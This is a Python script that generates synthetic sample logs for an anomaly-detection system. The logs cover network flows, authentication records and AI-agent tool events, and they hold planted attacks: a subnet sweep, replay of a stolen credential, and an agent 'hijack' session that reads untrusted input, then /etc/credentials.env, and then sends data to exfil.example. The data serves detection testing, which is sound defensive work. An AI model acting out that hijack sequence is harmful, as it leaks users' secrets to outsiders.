"""
make_samples.py — generates the small sample files shipped in samples/
so anyone cloning the repository can run APIS end to end in 30 seconds
without needing the 8 GB LANL dataset.

The data is synthetic and deliberately small. It exists to demonstrate
that the system runs and what its output looks like, NOT to reproduce
the evaluation results in the README. Those come from real LANL data,
which is linked in the README and is not redistributable here.
"""

import json
import os
import random
from datetime import datetime, timedelta

random.seed(1337)
OUT = "samples"
os.makedirs(OUT, exist_ok=True)

# ---------------------------------------------------------------- flow side
DEVICES = ["10.0.2.10", "10.0.2.11", "10.0.2.12", "10.0.2.13"]
SERVERS = ["10.0.2.20", "10.0.2.21", "10.0.2.22"]
PORTS = [443, 445, 3389, 22, 80]

def flow_row(ts, src, dst, port, nbytes, banner=""):
    return f"{ts.isoformat()},{src},{dst},{port},{nbytes},{banner}"

def write_flow(path, rows):
    with open(path, "w", encoding="utf-8") as f:
        f.write("timestamp,src_ip,dst_ip,dst_port,bytes,ssh_banner\n")
        f.write("\n".join(rows) + "\n")

# clean training window: each device talks to a small, stable set of peers
start = datetime(2026, 3, 2, 8, 0, 0)
clean = []
for day in range(3):
    for hour in range(8, 18):
        for i, dev in enumerate(DEVICES):
            peers = SERVERS[: (i % 2) + 2]          # 2-3 stable peers each
            for peer in peers:
                for _ in range(random.randint(1, 3)):
                    ts = start + timedelta(days=day, hours=hour - 8,
                                           minutes=random.randint(0, 59),
                                           seconds=random.randint(0, 59))
                    clean.append(flow_row(ts, dev, peer,
                                          random.choice([443, 445]),
                                          random.randint(800, 4000)))
clean.sort()
write_flow(f"{OUT}/sample_traffic_clean.txt", clean)

# evaluation window: same normal behaviour, plus one device sweeping the subnet
eval_start = datetime(2026, 3, 5, 8, 0, 0)
evald = []
for hour in range(8, 18):
    for i, dev in enumerate(DEVICES):
        peers = SERVERS[: (i % 2) + 2]
        for peer in peers:
            for _ in range(random.randint(1, 3)):
                ts = eval_start + timedelta(hours=hour - 8,
                                            minutes=random.randint(0, 59),
                                            seconds=random.randint(0, 59))
                evald.append(flow_row(ts, dev, peer,
                                      random.choice([443, 445]),
                                      random.randint(800, 4000)))

# the attack: 10.0.2.10 fans out across hosts it has never contacted,
# on ports it never uses, at machine speed, late in the day
attack_at = eval_start + timedelta(hours=9, minutes=12)
for n in range(18):
    ts = attack_at + timedelta(seconds=n * 4)
    evald.append(flow_row(ts, "10.0.2.10", f"10.0.2.{40 + n}",
                          random.choice([3389, 22, 445]),
                          random.randint(200, 900),
                          "SSH-2.0-paramiko_3.4.0" if n % 3 == 0 else ""))
# then a bulk transfer out
evald.append(flow_row(attack_at + timedelta(minutes=3), "10.0.2.10",
                      "10.0.2.57", 445, 2_400_000))
evald.sort()
write_flow(f"{OUT}/sample_traffic.txt", evald)

# ------------------------------------------------------------ identity side
# LANL auth.txt format: 9 comma-separated fields, '?' where unknown
USERS = ["U101@DOM1", "U102@DOM1", "U103@DOM1"]
COMPUTERS = ["C101", "C102", "C103", "C104", "C105"]

def auth_row(t, user, src, dst, ok=True):
    return (f"{t},{user},{user},{src},{dst},Kerberos,Network,LogOn,"
            f"{'Success' if ok else 'Fail'}")

auth_clean, auth_eval = [], []
# each user works from one machine and reaches two OTHER machines.
# src must never equal dst - a host authenticating to itself is unusual
# and the identity layer correctly flags it.
ROUTES = {USERS[0]: ("C101", ["C102", "C103"]),
          USERS[1]: ("C102", ["C103", "C104"]),
          USERS[2]: ("C103", ["C104", "C105"])}
t = 1
for _ in range(240):
    for user, (src, dsts) in ROUTES.items():
        for dst in dsts:
            auth_clean.append(auth_row(t, user, src, dst)); t += 1
with open(f"{OUT}/sample_auth_clean.txt", "w", encoding="utf-8") as f:
    f.write("\n".join(auth_clean) + "\n")

t = 100000
for _ in range(120):
    for user, (src, dsts) in ROUTES.items():
        for dst in dsts:
            auth_eval.append(auth_row(t, user, src, dst)); t += 1
# credential theft: U101's credential is replayed from C199, a machine
# it has never used, against hosts it has never reached. The attacker
# both spreads across hosts AND retries the first one - so the sample
# demonstrates both confirmation paths: type diversity and repetition.
n = 0
for dst in COMPUTERS:
    auth_eval.append(f"{t + n},U101@DOM1,U101@DOM1,C199,{dst},NTLM,Network,LogOn,Success")
    n += 1
for _ in range(4):
    auth_eval.append(f"{t + n},U101@DOM1,U101@DOM1,C199,C101,NTLM,Network,LogOn,Success")
    n += 1
with open(f"{OUT}/sample_auth.txt", "w", encoding="utf-8") as f:
    f.write("\n".join(auth_eval) + "\n")

# --------------------------------------------------------------- agent side
AGENT = "claude-code:sample-workspace"
WS = "/home/dev/sample-workspace"

def agent_event(t, tool, target, action, prov, size, external=False, session="s1"):
    return json.dumps({
        "time": t, "agent_id": AGENT, "session_id": session, "tool": tool,
        "target": target, "action": action, "input_provenance": prov,
        "result_size": size, "success": True, "external": external,
    })

agent = []
t = 1_770_000_000.0
for s in range(4):                          # four ordinary working sessions
    base = t + s * 3600
    for i in range(20):
        ts = base + i * 20
        pick = random.random()
        if pick < 0.45:
            agent.append(agent_event(ts, "Read", f"{WS}/app.py", "read", "trusted",
                                     random.randint(600, 1800), False, f"s{s}"))
        elif pick < 0.7:
            agent.append(agent_event(ts, "Write", f"{WS}/out.md", "write", "trusted",
                                     random.randint(600, 1800), False, f"s{s}"))
        elif pick < 0.9:
            agent.append(agent_event(ts, "Bash", "python", "execute", "unknown",
                                     random.randint(400, 1500), False, f"s{s}"))
        else:
            agent.append(agent_event(ts, "Glob", f"{WS}/**/*.py", "read", "unknown",
                                     random.randint(200, 900), False, f"s{s}"))

with open(f"{OUT}/sample_agent_events_clean.txt", "w", encoding="utf-8") as f:
    f.write("\n".join(agent) + "\n")

# hijack: reads untrusted external content, then acts outward and exfiltrates
atk = t + 5 * 3600
agent += [
    agent_event(atk,      "Read",     f"{WS}/app.py", "read", "trusted", 1200, False, "atk"),
    agent_event(atk + 8,  "Read",     "/data/vendor_feed.csv", "read", "untrusted", 1400, True, "atk"),
    agent_event(atk + 16, "Read",     "/etc/credentials.env", "read", "trusted", 900, True, "atk"),
    agent_event(atk + 24, "Bash",     "/usr/bin/curl", "execute", "unknown", 1100, True, "atk"),
    agent_event(atk + 33, "WebFetch", "https://exfil.example/collect", "write", "untrusted", 980_000, True, "atk"),
]
with open(f"{OUT}/sample_agent_events.txt", "w", encoding="utf-8") as f:
    f.write("\n".join(agent) + "\n")

for name in sorted(os.listdir(OUT)):
    p = os.path.join(OUT, name)
    print(f"  {name:32s} {sum(1 for _ in open(p)):5d} lines")
